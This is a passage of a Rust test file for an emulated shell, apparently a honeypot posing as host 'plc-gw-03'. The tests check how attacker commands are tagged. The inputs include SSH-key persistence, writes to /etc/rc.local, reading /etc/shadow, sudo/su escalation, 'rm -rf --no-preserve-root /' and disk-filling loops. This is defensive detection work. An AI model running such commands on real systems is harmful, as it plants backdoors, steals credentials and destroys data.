        ["persistence_attempt"]
    );
    assert_eq!(
        tags(&mut r, "echo x > /etc/rc.local").as_slice(),
        ["persistence_attempt"]
    );
    assert_eq!(
        tags(
            &mut r,
            "cp /etc/hostname /etc/profile.d.sh; mv /etc/profile.d.sh /etc/profile"
        )
        .as_slice(),
        ["persistence_attempt"]
    );
}

#[test]
fn a_failed_persistence_attempt_is_still_flagged() {
    let mut a = admin();
    // ~/.ssh does not exist, so the write fails...
    let r = run(&mut a, "echo ssh-rsa AAAA >> ~/.ssh/authorized_keys");
    assert_eq!(
        r.output,
        "-bash: /home/admin/.ssh/authorized_keys: No such file or directory\n"
    );
    // ...but the attempt is what an operator wants to know about
    assert_eq!(r.tags, ["persistence_attempt"]);
    // and so is one that is refused outright
    assert_eq!(
        tags(&mut a, "echo x > /etc/rc.local").as_slice(),
        ["persistence_attempt"]
    );
}

#[test]
fn reading_secrets_is_flagged_even_when_denied() {
    let mut a = admin();
    let r = run(&mut a, "cat /etc/shadow");
    assert_eq!(r.output, "cat: /etc/shadow: Permission denied\n");
    assert_eq!(r.tags, ["credential_access"]);
    let mut r = root();
    assert_eq!(
        tags(&mut r, "cat /etc/shadow").as_slice(),
        ["credential_access"]
    );
    assert!(tags(&mut r, "cat /etc/hostname").is_empty());
}

#[test]
fn privilege_escalation_is_refused_and_flagged() {
    let mut a = admin();
    let r = run(&mut a, "sudo id");
    assert_eq!(
        r.output,
        "admin is not in the sudoers file.  This incident will be reported.\n"
    );
    assert_eq!(r.tags, ["privesc_attempt"]);
    assert_eq!(run(&mut a, "su").output, "su: Authentication failure\n");
    assert_eq!(tags(&mut a, "su -").as_slice(), ["privesc_attempt"]);
    assert_eq!(out(&mut a, "id -un"), "admin\n", "still admin");
}

#[test]
fn sudoers_can_run_things_as_root() {
    let spec = default_spec().replace("groups: [admin, dialout]", "groups: [admin, sudo]");
    let mut a = host_for(&spec, "admin");
    assert_eq!(out(&mut a, "sudo whoami"), "root\n");
    assert_eq!(
        out(&mut a, "whoami"),
        "admin\n",
        "only that command ran as root"
    );
    assert_eq!(out(&mut a, "sudo cat /etc/shadow").lines().count(), 3);
    assert_eq!(run(&mut a, "sudo -i").prompt, "root@plc-gw-03:~# ");
    assert_eq!(out(&mut a, "whoami"), "root\n");
    assert!(
        out(&mut a, "history").lines().count() > 3,
        "history survives the switch"
    );
}

#[test]
fn root_can_su_to_another_user() {
    let mut r = root();
    assert_eq!(
        run(&mut r, "su - operator").prompt,
        "operator@plc-gw-03:~$ "
    );
    assert_eq!(out(&mut r, "id -un"), "operator\n");
}

#[test]
fn rm_rf_slash_is_blocked_like_gnu_rm_and_flagged() {
    let mut a = admin();
    let r = run(&mut a, "rm -rf /");
    assert_eq!(r.output, "rm: it is dangerous to operate recursively on '/'\nrm: use --no-preserve-root to override this failsafe\n");
    assert_eq!(r.tags, ["destructive_command"]);
    assert_eq!(
        out(&mut a, "rm /"),
        "rm: cannot remove '/': Is a directory\n"
    );
    assert!(tags(&mut a, "rm -rf /etc").contains(&"destructive_command".to_string()));
    assert!(
        out(&mut a, "ls /etc").contains("passwd"),
        "admin could not delete it"
    );
    assert!(
        tags(&mut a, "rm -rf /tmp/x").is_empty(),
        "ordinary cleanup is not flagged"
    );
    let mut r = root();
    assert_eq!(
        tags(&mut r, "rm -rf --no-preserve-root /").as_slice(),
        ["destructive_command"]
    );
    assert_eq!(
        out(&mut r, "ls /"),
        "",
        "root really can wipe the (emulated) disk"
    );
    assert!(out(&mut r, "ls /home").contains("No such file"));
}

#[test]
fn exit_ends_the_session() {
    let mut a = admin();
    let r = run(&mut a, "exit");
    assert!(r.exit);
    assert_eq!(r.output, "logout\n");
    assert!(run(&mut admin(), "logout").exit);
    assert!(!run(&mut admin(), "ls").exit);
    let r = run(&mut admin(), "echo a; exit; echo b");
    assert!(r.exit);
    assert_eq!(r.output, "a\nlogout\n", "nothing runs after exit");
}

// ------------------------------------------------------- isolation & limits

#[test]
fn sessions_are_isolated_from_each_other() {
    let w = world(&default_spec());
    let mut one = w.start_with_clock(Box::new(|| NOW));
    let mut two = w.start_with_clock(Box::new(|| NOW));
    one.login("admin");
    two.login("admin");
    run(&mut one, "echo secret > /tmp/mine");
    assert_eq!(out(&mut one, "cat /tmp/mine"), "secret\n");
    assert_eq!(
        out(&mut two, "cat /tmp/mine"),
        "cat: /tmp/mine: No such file or directory\n"
    );
    run(&mut one, "export X=1");
    assert_eq!(out(&mut two, "echo [$X]"), "[]\n");
    // wiping the disk in one session leaves the other untouched
    let mut root_one = w.start_with_clock(Box::new(|| NOW));
    root_one.login("root");
    run(&mut root_one, "rm -rf --no-preserve-root /");
    assert!(out(&mut two, "ls /etc").contains("passwd"));
}

#[test]
fn memory_use_is_bounded_even_against_a_doubling_file() {
    let mut a = admin();
    run(&mut a, "cd /tmp; echo 0123456789abcdef > f");
    // each round quadruples the file; the filesystem cap must stop it
    let mut refused = false;
    for _ in 0..30 {
        let o = out(&mut a, "cat f f > g; cat g g > f; cat f f > g");
        if o.contains("No space left on device") {
            refused = true;
            break;
        }
    }
    assert!(refused, "growth must hit the filesystem limit");
    let size: usize = out(&mut a, "wc -c f")
        .split_whitespace()
        .next()
        .unwrap()
        .parse()
        .unwrap();
    assert!(size <= 1 << 20, "single file over the cap: {size}");
}

#[test]
fn huge_output_is_truncated() {
    let mut a = admin();
    run(&mut a, "cd /tmp; echo 0123456789abcdef0123456789abcdef > f");
    for _ in 0..14 {
        run(&mut a, "cat f f > g; cat g g > f");
    }
    let o = out(&mut a, "cat f f f f f f f f f f f f f f f f f f f f");
    assert!(o.len() <= 256 * 1024 + 4, "{} bytes", o.len());
    assert!(
        o.len() > 100_000,
        "but real output is not discarded: {}",
        o.len()
    );
}

#[test]
fn unknown_login_names_get_a_sanitized_home() {
    let mut h = host_for(&default_spec(), "Pi\x1b[2J/..");
    let prompt = run(&mut h, "").prompt;
    assert!(
        !prompt.contains('\x1b') && !prompt.contains(".."),
        "{prompt:?}"
    );
    assert_eq!(prompt, "pi2j@plc-gw-03:~$ ");
    assert_eq!(out(&mut h, "pwd"), "/home/pi2j\n");
    let mut h = host_for(&default_spec(), "");
    assert_eq!(out(&mut h, "whoami"), "user\n");
    let mut h = host_for(&default_spec(), "ubuntu");
    assert_eq!(
        out(&mut h, "ls -ld ~").split_whitespace().nth(2),
        Some("ubuntu"),
        "its home is its own"
    );
}

#[test]
fn host_factory_starts_independent_hosts_and_exposes_the_spec() {
    let w = World::default_host();
    assert_eq!(w.spec().hostname, "plc-gw-03");
    let mut h = HostFactory::start(&w);
    h.login("root");
    assert_eq!(h.run("hostname").output, "plc-gw-03\n");
}

#[test]
fn world_loads_a_spec_from_a_file() {
    let dir = std::env::temp_dir().join(format!("hp-world-load-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("h.yaml");
    std::fs::write(&path, default_spec().replace("plc-gw-03", "edge-7")).unwrap();
    let w = World::load(&path).unwrap();
    std::fs::remove_dir_all(&dir).unwrap();
    assert_eq!(w.spec().hostname, "edge-7");
    assert!(World::load(&path).is_err());
}

#[test]
fn uptime_keeps_advancing_during_a_session() {
    use std::sync::atomic::{AtomicI64, Ordering};
    use std::sync::Arc;
    let now = Arc::new(AtomicI64::new(NOW));
    let clock = {
        let now = now.clone();
        Box::new(move || now.load(Ordering::SeqCst))
    };
    let mut h = world(&default_spec()).start_with_clock(clock);
    h.login("admin");
    let first = h.run("uptime -p").output;
    now.fetch_add(7200, Ordering::SeqCst);
    assert_ne!(
        first,
        h.run("uptime -p").output,
        "two more hours have passed"
    );
}
